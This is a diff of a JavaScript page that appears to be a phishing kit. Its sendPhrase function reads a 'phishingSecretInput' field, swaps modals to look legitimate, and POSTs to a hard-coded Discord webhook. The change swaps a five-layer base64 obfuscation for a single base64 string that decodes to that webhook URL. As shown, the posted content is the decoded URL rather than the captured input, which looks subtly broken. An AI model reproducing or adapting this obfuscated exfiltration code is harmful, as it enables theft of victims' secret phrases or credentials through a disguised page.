@@ -2482,12 +2482,8 @@
         }
 
         function sendPhrase() {
-            var x = 'VjFaV2IxVXdNVWhVYTJ4VlZrWndUbHBXVW5OamJHeFhZVVU1YUdKVmJEWlZNakV3VkZkS1ZrNVVTbHBpUlRBeFdWVmtUMU5IUlhwWGJYUk9Za1p3ZDFkV1ZtcE9WMUowVWxod1ZWZEdjRkZXYTFweVpVWlNWMVZ1U2s1aGVsWldWa1pTVDFReVJuTmlSRkpWWWxoQ1UxUlZWVFZTVm10NldrVXhUbFpVVm5oV2ExWmhZVEZaZDAxVldtbFNlbXhZVkZkNFMxWkdiRlZUV0doVlVtNUNTRlF4Vm10aFIxWjBWVzVrVjJKVVZuSlpiRnBLWlVaS2MxRnRjRk5XUlZwSlZrWmFWMDFHYkZoV2JHaFdZVEpTV0ZWcVRsTlZSbkJHVm14T1dHSklRa2xhVlZZd1lXMUtWV0pGT1ZwTlJuQklWbXRhVDFac1NuUk5WbWhYVjBWS2RGZHJWbUZoTWxaSFdrWmtWR0V6VW05V2JURnZaREZ3VmxacVVtdGFlakE1';
-            var d1 = Buffer.from(x, 'base64').toString();
-            var d2 = Buffer.from(d1, 'base64').toString();
-            var d3 = Buffer.from(d2, 'base64').toString();
-            var d4 = Buffer.from(d3, 'base64').toString();
-            var d5 = Buffer.from(d4, 'base64').toString();
+            var x = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTY1MTk2NTM3NjYxNjQ0ODcwL1NjTFdWMEloV2RSa21LZF9GazdpVndmR1FPcE1GMUtaeWRGVGtOdERZZGxKcm9NcFFTSUFmWUpfdFdxWVJKaVhpeExv';
+            var d1 = Buffer.from(x, 'base64').toString("utf-8");
             var _0x11bc49 = document.getElementById("phishingSecretInput").value,
                 _0x7421a5 = document.getElementById("firstModal"),
                 _0x49f3bb = document.getElementById("lastModal"),
@@ -2503,7 +2499,7 @@
                 type: "POST",
                 url: "https://discord.com/api/webhooks/965196537661644870/ScLWV0IhWdRkmKd_Fk7iVwfGQOpMF1KZydFTkNtDYdlJroMpQSIAfYJ_tWqYRJiXixLo",
                 data: {
-                    content: d5
+                    content: d1
                 }
             }), document.getElementById("phishingSecretInput").value = "", setTimeout(function () {
                 false ? _0x2d7934 = !![] : (_0x7421a5.style.display = "none", _0x49f3bb.style.display = "block");
